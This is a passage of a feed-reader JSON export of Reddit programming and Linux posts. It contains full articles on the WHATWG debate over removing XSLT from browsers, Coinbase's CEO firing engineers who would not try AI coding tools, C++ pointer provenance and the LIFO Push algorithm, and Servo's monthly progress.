{"id":"i2nisf4o","title":"Reddit","displayTitle":"Reddit","url":"","feedLink":"","isQuery":true,"isEmpty":false,"isHidden":false,"itemCount":380,"items":[{"title":"Video: LibreOffice 25.8 – Some of the new features","url":"https://www.youtube.com/watch?v=6dIRR37PF7M","date":1755938047,"author":"/u/themikeosguy","guid":237241,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/linux/comments/1mxw2e2/video_libreoffice_258_some_of_the_new_features/"},{"title":"Upgrading cluster in-place coz I am too lazy to do blue-green","url":"https://www.reddit.com/r/kubernetes/comments/1mxuf5v/upgrading_cluster_inplace_coz_i_am_too_lazy_to_do/","date":1755931848,"author":"/u/suman087","guid":237201,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"[D] Help Suggesting a best model for my sales prediction dataset","url":"https://www.reddit.com/r/MachineLearning/comments/1mxtzj4/d_help_suggesting_a_best_model_for_my_sales/","date":1755930272,"author":"/u/Amjad_Fz","guid":237220,"unread":true,"content":"<p>I’ve got a dataset from an FMCG company with columns like <em>BranchName, RouteName, CustomerCode, ProductCategory, ProductName, Quantity, SaleAmount, BillDate, SalesmanCode</em>.</p><p>Goal: Predict <strong>sales targets for each salesman</strong> based on historical data.</p><p>Can u guys suggest which would perform best for predicting daily targets for Salesman</p>","contentLength":328,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"The linux corner","url":"https://www.reddit.com/r/linux/comments/1mxt6yk/the_linux_corner/","date":1755927463,"author":"/u/Beautiful_Beyond3461","guid":237204,"unread":true,"content":"   submitted by   <a href=\"https://www.reddit.com/user/Beautiful_Beyond3461\"> /u/Beautiful_Beyond3461 </a>","contentLength":43,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"No, Google Did Not Unilaterally Decide to Kill XSLT","url":"https://meyerweb.com/eric/thoughts/2025/08/22/no-google-did-not-unilaterally-decide-to-kill-xslt/","date":1755926466,"author":"/u/AlyoshaV","guid":237202,"unread":true,"content":"<p>It’s uncommon, but not unheard of, for a GitHub issue to spark an uproar.&nbsp; That happened over the past month or so as the WHATWG (Web Hypertext Application Technology Working Group, which I still say should have called themselves a Task Force instead) issue “<a href=\"https://github.com/WHATWG/html/issues/11523\">Should we remove XSLT from the web platform?</a>” was opened, debated, and eventually locked once the comment thread started spiraling into personal attacks.&nbsp; Other discussions have since opened, such as <a href=\"https://github.com/whatwg/html/issues/11578\"> a counterproposal to update XSLT in the web platform</a>, thankfully with (thus far) much less heat.</p><p>If you’re new to the term, XSLT (Extensible Stylesheet Language Transformations) is an XML language that lets you transform one document tree structure into another.&nbsp; If you’ve ever heard of people styling their RSS and/or Atom feeds to look nice in the browser, they were using some amount of XSLT to turn the RSS/Atom into HTML, which they could then CSS into prettiness.</p><p>This is not the only use case for XSLT, not by a long shot, but it does illustrate the sort of thing XSLT is good for.&nbsp; So why remove it, and who got this flame train rolling in the first place?</p><p>Before I start, I want to note that in this post, I won’t be commenting on whether or not XSLT support should be dropped from browsers or not.&nbsp; I’m also not going to be systematically addressing the various reactions I’ve seen to all this.&nbsp; I have my own biases around this — some of them in direct conflict with each other! — but my focus here will be on what’s happened so far and what might lie ahead.</p><p>As a very quick background, various people have proposed removing XSLT support from browsers a few times over the quarter-century-plus since support first landed.&nbsp; It was discussed in both the early and mid-2010s, for example.&nbsp; At this point, browsers all more or less support<a href=\"https://www.w3.org/TR/xslt-10/\">XSLT 1.0</a>, whereas the latest version of XSLT is <a href=\"https://www.w3.org/TR/xslt-30/\">3.0</a>.&nbsp; I believe they all do so with C++ code, which is therefore not memory-safe, that is baked into the code base rather than supported via some kind of plugged-in library, like Firefox using <a href=\"https://github.com/mozilla/pdf.js\"> PDF.js</a> to support PDFs in the browser.</p><p>Anyway, back on August 1st, Mason Freed of Google opened <a href=\"https://github.com/WHATWG/html/issues/11523\">issue #11523</a> on WHATWG’s HTML repository, asking if XSLT should be removed from browsers and giving a condensed set of reasons why it might be a good idea.&nbsp; He also included a WASM-based polyfill he’d written to provide XSLT support, should browsers remove it, and opened “<a href=\"https://issues.chromium.org/issues/435623334\"> Investigate deprecation and removal of XSLT</a>” in the Chromium bug tracker.</p><p>“So it’s already been decided and we just have to bend over and take the changes our Googlish overlords have decreed!” many people shouted.&nbsp; It’s not hard to see where they got that impression, given some of the things Google has done over the years, but that’s  what’s happening here.&nbsp; Not at this point.&nbsp; I’d like to set some records straight, as an outside observer of both Google and the issue itself.</p><p>First of all, while Mason was the one to open the issue, this was done because the idea was raised in a periodic WHATNOT meeting (call), where someone at Mozilla was actually the one to bring it up, after it had come up in various conversations over the previous few months.&nbsp; After Mason opened the issue, members of the Mozilla and WebKit teams expressed (tentative, mostly) support for the idea of exploring this removal.&nbsp; Basically,  of the vendors are particularly keen on keeping native XSLT support in their codebases, particularly after <a href=\"https://www.neowin.net/news/google-project-zero-exposes-security-flaw-in-libxslt-library-used-in-gnome-applications/\"> security flaws were found</a> in XSLT implementations.</p><p>This isn’t the first time they’ve all agreed it might be nice to slim their codebases down a little by removing something that doesn’t get a lot of use (relatively speaking), and it won’t be the last.&nbsp; I bet they’ve all talked at some point about how nice it would be to remove <a href=\"https://en.wikipedia.org/wiki/BMP_file_format\">BMP</a> support.</p><p>Mason mentioned that they didn’t have resources to put toward updating their XSLT code, and got widely derided for it. “Google has trillions of dollars!” people hooted.&nbsp;  has trillions of dollars.&nbsp; The Chrome team very much does not.&nbsp; They probably get, at best, a tiny fraction of one percent of those dollars.&nbsp; Whether Google should give the Chrome team more money is essentially irrelevant, because that’s not in the Chrome team’s control.&nbsp; They have what they have, in terms of head count and time, and have to decide how those entirely finite resources are best spent.</p><p>(I will once again invoke my late-1900s formulation of <a href=\"https://en.wikipedia.org/wiki/Hanlon's_razor\">Hanlon’s Razor</a>: <em> Never attribute to malice that which can be more adequately explained by resource constraints.</em>)</p><p>Second of all, the issue was opened to start a discussion and gather feedback as the first stage of a multi-step process, one that could easily run for years.&nbsp; Google, as I assume is true for other browser makers, has a pretty comprehensive method for working out whether removing a given feature is tenable or not.&nbsp; <a href=\"https://bkardell.com\">Brian</a> and I <a href=\"https://www.igalia.com/chats/unshipping\"> talked with Rick Byers about it</a> a while back, and I was impressed by both how many things been removed, and what they do to make sure they’re removing the right things.</p><p>Here’s one (by no means the only!) way they could go about this:</p><ol type=\"1\"><li>Set up a switch that allows XSLT to be disabled.</li><li>In the next release of Chrome, use the switch to disable XSLT in one percent of all Chrome downloads.</li><li>See if any bug reports come in about it.&nbsp; If so, investigate further and adjust as necessary if the problems are not actually about XSLT.</li><li>If not, up the percentage of XSLT-disabled downloads a little bit at a time over a number of releases.&nbsp; If no bugs are reported as the percentage of XSLT-disabled users trends toward 100%, then prepare to remove it entirely.</li><li>If, on the other hand, it becomes clear that removing XSLT will be a widely breaking change  — &nbsp;where “widely” can still mean a very tiny portion of their total user base — then XSLT can be re-enabled for all users as soon as possible, and the discussion taken back up with this new information in hand.</li></ol><p>Again, that is just one of several approaches Google could take, and it’s a lot simpler than what they would most likely actually do, but it’s roughly what they default to, as I understand it.&nbsp; The process is slow and deliberate, building up a picture of actual use and user experience.</p><p>Third of all, opening a bug that includes a pull request of code changes isn’t a declaration of countdown to merge, it’s a way of making crystal clear (to those who can read the codebase) exactly what the proposal would entail.&nbsp; It’s basically a requirement for the process of making a decision to start, because it sets the exact parameters of what’s being decided on.</p><p>That said, as a result of all this, I now strongly believe that every proposed-removal issue should point to the process and where the issue stands in it. (And write down the process if it hasn’t been already.) This isn’t for the issue’s intended audience, which was other people within WHATWG who are familiar with the usual process and each other, but for cases of context escape, like happened here.&nbsp; If a removal discussion is going to be held in public, then it should assume the general public will see it and provide enough context for the general public to understand the actual nature of the discussion.&nbsp; In the absence of that context, the nature of the discussion will be assumed, and every assumption will be different.</p><p>There is one thing that we should all keep in mind, which is that “remove from the web platform” really means “remove from browsers”.&nbsp; Even if this proposal goes through, XSLT could still be used server-side.&nbsp; You could use libraries that support XSLT versions more recent than 1.0, even!&nbsp; Thus, XML could still be turned into HTML, just not in the client via native support, though JS or WASM polyfills, or even add-on extensions, would still be an option.&nbsp; Is that good or bad?&nbsp; Like everything else in our field, the answer is “it depends”.</p><p>Just in case your eyes glazed over and you quickly skimmed to see if there was a TL;DR, here it is:</p><p><em>The discussion was opened by a Google employee in response to interest from multiple browser vendors in removing built-in XSLT, following a process that is opaque to most outsiders.&nbsp; It’s a first step in a multi-step evaluation process that can take years to complete, and whose outcome is not predetermined.&nbsp; Tempers flared and the initial discussion was locked; the conversation continues elsewhere.&nbsp; There are good reasons to drop native XSLT support in browsers, and also good reasons to keep or update it, but XSLT is not itself at risk.</em></p>","contentLength":8626,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/programming/comments/1mxswpp/no_google_did_not_unilaterally_decide_to_kill_xslt/"},{"title":"Coinbase CEO explains why he fired engineers who didn’t try AI immediately","url":"https://techcrunch.com/2025/08/22/coinbase-ceo-explains-why-he-fired-engineers-who-didnt-try-ai-immediately/","date":1755924216,"author":"/u/diegoargento1","guid":237191,"unread":true,"content":"<p>It’s hard to find programmers these days who aren’t using AI coding assistants in some capacity, especially to write the repetitive, mundane bits.</p><p>But those who refused to try the tools when Coinbase bought enterprise licenses for GitHub Copilot and Cursor got promptly fired, CEO Brian Armstrong said this week on John Collison’s podcast <a href=\"https://www.youtube.com/watch?v=JeVny5KHj4g&amp;list=PLcoWp8pBTM3ATMYLP-hFIhJORSw-nFOiY&amp;index=2\" target=\"_blank\" rel=\"noreferrer noopener nofollow\">“Cheeky Pint.”</a> (Collison is the co-founder and president of the payments company Stripe.)</p><p>After getting licenses to cover every engineer, some at the cryptocurrency exchange warned Armstrong that adoption would be slow, predicting it would take months to get even half the engineers using AI.&nbsp;</p><p>Armstrong was shocked at the thought. “I went rogue,” he said, and posted a mandate in the company’s main engineering Slack channel. “I said, ‘AI is important. We need you to all learn it and at least onboard. You don’t have to use it every day yet until we do some training, but at least onboard by the end of the week. And if not, I’m hosting a meeting on Saturday with everybody who hasn’t done it and I’d like to meet with you to understand why.’”&nbsp;</p><p>At the meeting, some people had reasonable explanations for not getting their AI assistant accounts set up during the week, like being on vacation, Armstrong said.</p><p>“I jumped on this call on Saturday and there were a couple people that had not done it. Some of them had a good reason, because they were just getting back from some trip or something, and some of them didn’t [have a good reason]. And they got fired.”</p><p>Armstrong admits that it was a “heavy-handed approach” and there were people in the company who “didn’t like it.”</p><p>While it doesn’t sound like very many people were fired, Armstrong said it sent a clear message that AI is not optional. Still, everything about that story is wild: that there were engineers who wouldn’t spend a few minutes of their week signing up for and testing the AI assistant — the most hyped tech for coders ever — and that Armstrong was willing to fire them over it.</p><p>Coinbase did not respond to a request for comment.</p><p>Since then, Armstrong has leaned further into the training. He said the company hosts monthly meetings where teams who have mastered creative ways to use AI share what they have learned.</p><p>Interestingly, Collison, who has been <a href=\"https://fintechmagazine.com/articles/the-collison-brothers\" target=\"_blank\" rel=\"noreferrer noopener nofollow\">programming since childhood</a>, questioned how much companies should be relying on AI-generated code.</p><p>“It’s clear that it is very helpful to have AI helping you write code. It’s not clear how you run an AI-coded code base,” he commented.  Armstrong replied, “I agree.”</p><p>Indeed, as TechCrunch previously reported, <a href=\"https://techcrunch.com/2025/07/15/a-former-openai-engineer-describes-what-its-really-like-to-work-there/\">a former OpenAI engineer described</a> that company’s central code repository as “a bit of a dumping ground.” The engineer said management had begun dedicating engineering resources to improve the situation.</p><p><em>We’re always looking to evolve, and by providing some insight into your perspective and feedback into TechCrunch and our coverage and events, you can help us! Fill out&nbsp;</em><em>&nbsp;to let us know how we’re doing and get the chance to win a prize in return!</em></p>","contentLength":3093,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/programming/comments/1mxs92h/coinbase_ceo_explains_why_he_fired_engineers_who/"},{"title":"What on Earth Does Pointer Provenance Have to do With RCU?","url":"https://people.kernel.org/paulmck/what-on-earth-does-lifetime-end-pointer-zap-have-to-do-with-rcu","date":1755923066,"author":"/u/unixbhaskar","guid":237221,"unread":true,"content":"<p>TL;DR: Unless you are doing very strange things with RCU, not much!!!</p><p>So why has the guy most responsible for Linux-kernel spent so much time over the past five years working on the provenance-related lifetime-end pointer zap within the C++ Standards Committee?</p><h2>What is Pointer Provenance?</h2><p>Back in the old days, provenance was for objets d'art and the like, and we did not need them for our pointers, no sirree!!!  Pointers had bits, those bits formed memory addresses, and as often as not we didn't even need to worry about these addresses being translated.  But life is more complicated now.  On the other hand, computing life is also much bigger, faster, more reliable, and (usually) more productive, so be extremely careful what you wish for from back in the Good Old Days!</p><p>These days, pointers have provenance as well as addresses, and this has consequences.  The C++ Standard  (<a href=\"https://www.open-std.org/jtc1/sc22/wg21/docs/papers/2025/n5008.pdf\" rel=\"nofollow\">recent draft</a>) states that when an object's storage duration ends, any pointers to that object become invalid.  For its part, the C Standard states that when an object's storage duration ends, any pointers to that object become indeterminate.  In both standards, the wording is more precise, but this will serve for our purposes.</p><p>For the remainder of this document, we will follow C++ and say “invalid”, which is shorter than “indeterminate”.  We will balance this out by using C-language example code.  Those preferring C++ will be happy to hear that this is the language that I use in my <a href=\"https://cppcon2025.sched.com/event/27bR6/interesting-upcoming-low-latency-concurrency-and-parallelism-features-from-wroclaw-2024-hagenberg-2025-and-sofia-2025\" rel=\"nofollow\">upcoming CPPCON presentation</a>.</p><p>Neither standard places any constraints on what a compiler can do with an invalid pointer value, even if all you are doing is loading or storing that value.</p><p>Those of us who cut our teeth on assembly language might quite reasonably ask why anyone would even think to make pointers so invalid that you cannot even load or store them.  Let's start by looking at pointer comparisons using this code fragment:</p><pre><code>p = kmalloc(...);\nmight_kfree(p);         // Pointer might become invalid (AKA \"zapped\")\nq = kmalloc(...);       // Assume that the addresses of p and q are equal.\nif (p == q)             // Compiler can optimize as \"if (false)\"!!!\n    do_something();\n</code></pre><p>Both  and  contain addresses, but the compiler also keeps track of the fact that their values were obtained from different invocations of .  This information forms part of each pointer's provenance.  This means that  and  have different provenance, which in turn means that the compiler does not need to generate any code for the  comparison.  The two pointers' provenance differs, so the result cannot be anything other than .</p><p>And this is one motivation for pointer provenance and invalidity:  The results of operations on invalid pointers are not guaranteed, which provides additional opportunities for optimization.  This example perhaps seems a bit silly, but modern compilers can use pointer provenance and invalidity to carry out serious points-to and aliasing analysis.</p><p>Yes, you can have hardware provenance.  Examples include ARM MTE, the CHERI research prototype (which last I checked had issues with C++'s requirement that pointers are trivially copiable), and the venerable IBM System i.  Conventional systems provide pointer provenance of a sort via their page tables, which is used by a variety of memory-allocation-use debuggers, for but one example, the efence library.  The pointer-provenance features of ARM MTE and IBM System i are not problematic, but last I checked, the jury was still out on CHERI.</p><p>Of course, using invalid (AKA “dangling”) pointers is known to be a bad idea.  So why are we even talking about it???</p><h2>Why Would Anyone Use Invalid/Dangling Pointers?</h2><p>Please allow me to introduce you to the famous and frequently re-invented LIFO Push algorithm.  You can find this in many places, but let's focus on the Linux kernel's  and  functions.  The former atomically pushes a list of elements on a linked-list stack, and the latter just as atomically removes the entire contents of the stack:</p><pre><code>static inline bool llist_add_batch(struct llist_node *new_first,\n                                   struct llist_node *new_last,\n                                   struct llist_head *head)\n{\n    struct llist_node *first = READ_ONCE(head-&gt;first);\n\n    do {\n        new_last-&gt;next = first;\n    } while (!try_cmpxchg(&amp;head-&gt;first, &amp;first, new_first));\n\n    return !first;\n}\n\nstatic inline struct llist_node *llist_del_all(struct llist_head *head)\n{\n    return xchg(&amp;head-&gt;first, NULL);\n}\n</code></pre><p>As lockless concurrent algorithms go, this one is pretty straightforward.  The  function reads the list header, fills in the  pointer, then does a compare-and-exchange operation to point the list header at the new first element.  The  function is even simpler, doing a single atomic exchange operation to  out the list header and returning the elements that were previously on the list.  This algorithm also has excellent forward-progress properties: the  function is lock-free and the  function is wait-free.</p><p>In assembly language, or with a simple compiler, not much.  But to see the pointer-provenance issue with more heavily optimized languages, consider the following sequence of events:</p><ol><li>CPU 0 allocates an  B and passes it via both the  and  parameters of .</li><li>CPU 0 picks up the  pointer and places it in the  local variable, then assigns it to .  This  pointer now references  A.</li><li>CPU 1 invokes , which returns a list containing  A.  The caller of  processes A and passes it to .</li><li>CPU 0's  pointer is now invalid due to  A having been freed.  But CPU 0 does not know this.</li><li>CPU 1 allocates an  C that happens to have the same address as the old  A.  It passes C  via both the  and  parameters of , which runs to completion.  The  pointer now points to  C, which happens to have the same address as the now storage-duration-ended  A.</li><li>CPU 0 finally gets around to executing its , which given typical C compilers will succeed.  The  now contains an  B that contains an invalid pointer to dead  A, but whose pointer address happens to reference the shiny new  C.  (We term this invalid pointer a “zombie pointer” because it has in some assembly-language sense come back from the dead.)</li><li>Some CPU invokes  and gets back an  containing an invalid pointer.</li></ol><p>One could argue that the Linux-kernel implementation of LIFO Push is simply buggy and should be fixed.  Except that there is no reasonable way to fix it.  Which of course raises the question...</p><h2>What Are Unreasonable Fixes?</h2><p>We can protect pointers from invalidity by storing them as integers, but:</p><ol><li>Suppose someone has an element that they are passing to a library function.  They should not be required to convert all their  pointers to integer just because the library's developers decide to switch to the LIFO Push algorithm for some obscure internal operation.</li><li>In addition, switching to integer defeats type-checking, because integers are integers no matter what type of pointer they came from.</li><li>We could restore some type-checking capability by wrapping the integer into a differently named struct for each pointer type.  Except that this requires a struct with some particular name to be treated as compatible with pointers of some type corresponding to that name, a notion that current do not support.</li><li>In C++, we could use template metaprogramming to wrap an integer into a class that converts automatically to and from compatibly typed pointers.  But there would then be windows of time in which there was a real pointer, and at that time there would still be the possibility of pointer invalidity.</li><li>All of the above hack-arounds put additional obstacles in the way of developers of concurrent software.</li><li>In environments such as the Linux kernel that provides their own memory allocators, we can hide them from the compiler.  But this is not free, in fact, the patch that exposed the Linux-kernel's memory allocators to the compiler resulted in a small but significant improvement.</li></ol><p>However, it is fair to ask...</p><h2>Why Do We Care About Strange New Algorithms???</h2><p>Let's take a look at the history, courtesy of Maged Michael's diligent software archaeology.</p><p>In 1986, R. K. Treiber presented an assembly language implementation of the LIFO Push algorithm in technical report RJ 5118 entitled “Systems Programming: Coping with Parallelism” while at the IBM Almaden Research Center.</p><p><a href=\"https://patents.google.com/patent/US3886525\" rel=\"nofollow\">US Patent 3,886,525</a> was filed in June 1973, just a few months before I wrote my first line of code, and contains a prior-art reference to the LIFO Push algorithm (again with pop() instead of popall()) as follows: “Conditional swapping of a single address is sufficient to program a last-in, first-out single-user-at-a-time sequencing mechanism.”  (If you were to ask a patent attorney, you would likely be told that this 50-year-old patent has long since expired.  Which should be no surprise, given that it is even older than Dennis Ritchie's setuid <a href=\"https://patents.google.com/patent/US4135240A/en\" rel=\"nofollow\">Patent 4,135,240</a>.)</p><p>All three of these references describe LIFO push as if it was straightforward and well known.</p><p>So we don’t know who first invented LIFO Push or when they invented it, but it was well known in 1973.  Which is well over a decade before C was first standardized, more than two decades before C++ was first standardized, and even longer before work was started on Rust.</p><p>And its combination of (relative) simplicity and excellent forward-progress properties just might be why this algorithm was anonymously invented so long ago and why it is so persistently and repeatedly reinvented.  This frequent reinvention puts paid to any notion that LIFO Push is strange.</p><p>So sorry, but LIFO Push is neither new nor strange.</p><p>The lifetime-end pointer-zap story is not yet over, but we are currently pushing for the changes in four working papers.</p><h3>Nondeterministic Pointer Provenance</h3><p><a href=\"https://isocpp.org/files/papers/P2434R4.html\" rel=\"nofollow\">P2434R4 (“Nondeterministic pointer provenance”)</a> is the basis for the other three papers.  It asks that when converting a pointer to an integer and back, the implementation must choose a qualifying pointed-to object (if there is one) whose storage duration began before or concurrently with the conversion back to a pointer.  In particular, the implementation is free to ignore a qualifying pointed-to object when the conversion to pointer happens before the beginning of that object’s storage duration.</p><p>The “qualifying” qualifier includes compatible type, as well as sufficiently early and long storage duration.</p><p>But why restrict the qualifying pointed-to object's storage duration to begin before or concurrently with the conversion back to a pointer?</p><p>An instructive example by Hans Boehm may be found in P2434R4, which shows that reasonable (and more important, very heavily used) optimizations would be invalidated by this approach.  Several examples that manage to be even more sobering may be found in David Goldblatt's <a href=\"https://www.open-std.org/jtc1/sc22/wg21/docs/papers/2024/p3292r0.html\" rel=\"nofollow\">P3292R0 (“Provenance and Concurrency”)</a>.</p><h3>Pointer Lifetime-End Zap Proposed Solutions: Atomics and Volatile</h3><p><a href=\"https://www.open-std.org/jtc1/sc22/wg21/docs/papers/2025/p2414r9.pdf\" rel=\"nofollow\">P2414R10 (“Pointer lifetime-end zap proposed solutions: Atomics and volatile”)</a> is motivated by the observation that atomic pointers are subject to update at any time by any thread, which means that the compiler cannot reasonably do much in the way of optimization.  This paper therefore asks (1) that atomic operations be redefined to yield and to store prospective pointers values and (2) that operations on volatile pointers be defined to yield and to store prospective pointer values.  The effect is as if atomic pointers were stored internally as integers. This includes the “old” pointer passed by reference to compare_exchange().</p><p>This helps, but is not a full solution because atomic pointers are converted to non-atomic pointers prior to use, at which point they are subject to lifetime-end pointer zap.  And the standard does not even guarantee that a zapped pointer can even be loaded, stored, passed to a function, or returned from a function.  Which brings us to the next paper.</p><h3>Pointer Lifetime-End Zap Proposed Solutions: Tighten IDB for Invalid Pointers</h3><p><a href=\"https://www.open-std.org/jtc1/sc22/wg21/docs/papers/2025/p3347r3.pdf\" rel=\"nofollow\">P3347R3 (“Pointer lifetime-end zap proposed solutions: Tighten IDB for invalid pointers”)</a> therefore asks that all non-comparison non-arithmetic non-dereference computations involving pointers, specifically including normal loads and stores, are fully defined even if the pointers are invalid.  This permits invalid pointers to be loaded, stored, passed as arguments, and returned.  Fully defining comparisons would rule out optimizations, and fully defining arithmetic would be complex and thus far unneeded.</p><p>If these first three papers are accepted into the standard, the C++ implementation of LIFO Push show above becomes valid code.  This is important because this algorithm has been re-invented many times over the past half century, and is often open coded.  This makes it very hard to construct tools that find LIFO Push implementations in existing code.</p><h3>P3790R1: Pointer Lifetime-End Zap Proposed Solutions: Bag-of-Bits Pointer Class</h3><p><a href=\"https://www.open-std.org/jtc1/sc22/wg21/docs/papers/2025/p3790r0.pdf\" rel=\"nofollow\">P3790R1 (“Pointer lifetime-end zap proposed solutions: Bag-of-bits pointer class”)</a> asks that (1) the addition to the C++ standard library of the function <code>launder_bag_of_bits_ptr()</code> that takes a pointer argument and returns a prospective pointer value corresponding to its argument; and (2) the addition to the C++ standard library of the class template  that is a pointer-like type that is still usable after the pointed-to object’s lifetime has ended.  Of course, such a pointer still cannot be dereferenced unless there is a live object at that pointer's address.  Furthermore, some systems, such as ARMv9 with memory tagging extensions (MTE) enabled have provenance as well as address bits in the pointer, and on such systems dereferencing will fail unless the pointer's provenance bits happen to match those of the pointed-to object.</p><p>This function and template class is nevertheless quite useful for maintaining hash maps keyed by pointers after the pointed-to object's lifetime has ended.</p><p>Unlike LIFO Push, source-code changes are required for these use cases.  This is unfortunate, but we have thus far been unable to come up with a same-source-code approach.</p><p>Those who have participated in standards work (or even open-source work) will understand that the names <code>launder_bag_of_bits_ptr()</code> and  are still subject to bikeshedding.</p><h2>A Happen Lifetime-End Pointer Zap Ending?</h2><p>It is still too early to say for certain, but thus far these proposals are making much better progress than did their predecessors.  So who knows?  Perhaps C++29 will address lifetime-end pointer zap.</p>","contentLength":14444,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/linux/comments/1mxrwl4/what_on_earth_does_pointer_provenance_have_to_do/"},{"title":"[D] AAAI considered 2nd tier now?","url":"https://www.reddit.com/r/MachineLearning/comments/1mxrt1y/d_aaai_considered_2nd_tier_now/","date":1755922751,"author":"/u/Healthy_Horse_2183","guid":237203,"unread":true,"content":"<div><p>Isn’t AAAI in the same tier as NeurIPS/ICML/ICLR? ICLR literally has &gt;30% acceptance rate.</p></div>   submitted by   <a href=\"https://www.reddit.com/user/Healthy_Horse_2183\"> /u/Healthy_Horse_2183 </a>","contentLength":133,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"This month in Servo: new image formats, canvas backends, automation, and more!","url":"https://servo.org/blog/2025/08/22/this-month-in-servo/","date":1755914332,"author":"/u/KlasySkvirel","guid":237186,"unread":true,"content":"<p>Servo has smashed its record again in July, with  landing in our nightly builds!\nThis includes several new web platform features:</p><p>Notable changes for Servo library consumers:</p><p>Like many browsers, Servo has two kinds of zoom:  affects the size of the viewport, while  does not (<a href=\"https://github.com/shubhamg13\">@shubhamg13</a>, <a href=\"https://github.com/servo/servo/pull/38194\">#38194</a>).\n now correctly triggers reflow (<a href=\"https://github.com/mrobinson\">@mrobinson</a>, <a href=\"https://github.com/servo/servo/pull/38166\">#38166</a>), and  is now reset to the viewport meta config when navigating (<a href=\"https://github.com/shubhamg13\">@shubhamg13</a>, <a href=\"https://github.com/servo/servo/pull/37315\">#37315</a>).</p><p> is now isolated between webviews, and copied to new webviews with the same  (<a href=\"https://github.com/janvarga\">@janvarga</a>, <a href=\"https://github.com/servo/servo/pull/37803\">#37803</a>).</p><p> now has a  and , so you can now  on Linux (<a href=\"https://github.com/MichaelMcDonnell\">@MichaelMcDonnell</a>, <a href=\"https://github.com/servo/servo/pull/38038\">#38038</a>).\nWe’ve made it more ergonomic too, fixing both the sluggish  and <strong>pixel-perfect trackpad scrolling</strong> and the too fast  (<a href=\"https://github.com/yezhizhen\">@yezhizhen</a>, <a href=\"https://github.com/servo/servo/pull/37982\">#37982</a>).</p><p> is key to programmable graphics on the web, with Servo supporting WebGPU, WebGL, and 2D canvas contexts.\nBut the <strong>general-purpose 2D graphics</strong> routines that power Servo’s 2D canvases are potentially useful for a lot more than &lt;canvas&gt;:  is bread and butter for Servo, but  is only minimally supported right now, and  is not yet implemented at all.</p><p>Those features have one thing in common: they require things that WebRender can’t yet do.\n does one thing and does it well: rasterise the layouts of the web, really fast, by <a href=\"https://hacks.mozilla.org/2017/10/the-whole-web-at-maximum-fps-how-webrender-gets-rid-of-jank/\">using the GPU as much as possible</a>.\nFont rendering and SVG rendering both involve rasterising arbitrary paths, which currently has to be done outside WebRender, and PDF output is out of scope entirely.</p><p>The more code we can share between these tasks, the better we can make that code, and the smaller we can make Servo’s binary sizes (<a href=\"https://github.com/servo/servo/issues/38022\">#38022</a>).\nWe’ve started by moving 2D-&lt;canvas&gt;-specific state out of the  crate (<a href=\"https://github.com/sagudev\">@sagudev</a>, <a href=\"https://github.com/servo/servo/pull/38098\">#38098</a>, <a href=\"https://github.com/servo/servo/pull/38114\">#38114</a>, <a href=\"https://github.com/servo/servo/pull/38164\">#38164</a>, <a href=\"https://github.com/servo/servo/pull/38214\">#38214</a>), which has in turn allowed us to modernise it with <strong>new backends based on <a href=\"https://github.com/linebender/vello\">Vello</a></strong> (<a href=\"https://github.com/EnnuiL\">@EnnuiL</a>, <a href=\"https://github.com/sagudev\">@sagudev</a>, <a href=\"https://github.com/servo/servo/issues/30636\">#30636</a>, <a href=\"https://github.com/servo/servo/issues/38345\">#38345</a>):</p><ul><li><p>a Vello GPU-based backend (<a href=\"https://github.com/sagudev\">@sagudev</a>, <a href=\"https://github.com/servo/servo/pull/36821\">#36821</a>), currently slower than the default backend; to use it, build Servo with  and enable it with <code>--pref dom_canvas_vello_enabled</code></p></li><li><p>a Vello CPU-based backend (<a href=\"https://github.com/sagudev\">@sagudev</a>, <a href=\"https://github.com/servo/servo/pull/38282\">#38282</a>), <strong>already faster than the default backend</strong>; to use it, build Servo with  and enable it with <code>--pref dom_canvas_vello_cpu_enabled</code></p></li></ul><p>Many recent Servo bugs have been related to our handling of , , and  (<a href=\"https://github.com/servo/servo/issues/36817\">#36817</a>, <a href=\"https://github.com/servo/servo/issues/37804\">#37804</a>, <a href=\"https://github.com/servo/servo/issues/37824\">#37824</a>, <a href=\"https://github.com/servo/servo/issues/37878\">#37878</a>, <a href=\"https://github.com/servo/servo/issues/37978\">#37978</a>, <a href=\"https://github.com/servo/servo/issues/38089\">#38089</a>, <a href=\"https://github.com/servo/servo/issues/38090\">#38090</a>, <a href=\"https://github.com/servo/servo/issues/38093\">#38093</a>, <a href=\"https://github.com/servo/servo/issues/38255\">#38255</a>).\nSymptoms of these bugs include  (e.g. links that can’t be clicked),  to the end of the page, or  like disappearing browser UI or black bars.</p><p>Windows rarely take up the whole screen, viewports rarely take up the whole window due to window decorations, and when different units come into play, like CSS  vs device pixels, a more systematic approach is needed.\nWe built <a href=\"https://docs.rs/euclid/0.22.11/euclid/\"></a> to solve these problems in a strongly typed way within Servo, but beyond the viewport, we need to convert between euclid types and the geometry types provided by the embedder, the toolkit, the platform, or WebDriver, which creates opportunities for errors.</p><p>Servo is also on <a href=\"https://thanks.dev\">thanks.dev</a>, and already  (−3 from June) that depend on Servo are sponsoring us there.\nIf you use Servo libraries like <a href=\"https://crates.io/crates/url/reverse_dependencies\">url</a>, <a href=\"https://crates.io/crates/html5ever/reverse_dependencies\">html5ever</a>, <a href=\"https://crates.io/crates/selectors/reverse_dependencies\">selectors</a>, or <a href=\"https://crates.io/crates/cssparser/reverse_dependencies\">cssparser</a>, signing up for <a href=\"https://thanks.dev\">thanks.dev</a> could be a good way for you (or your employer) to give back to the community.</p><p>As always, use of these funds will be decided transparently in the Technical Steering Committee.\nFor more details, head to our <a href=\"https://servo.org/sponsorship/\">Sponsorship page</a>.</p>","contentLength":3367,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/linux/comments/1mxp3nt/this_month_in_servo_new_image_formats_canvas/"},{"title":"[D] Where are the AI startups working with diffusion 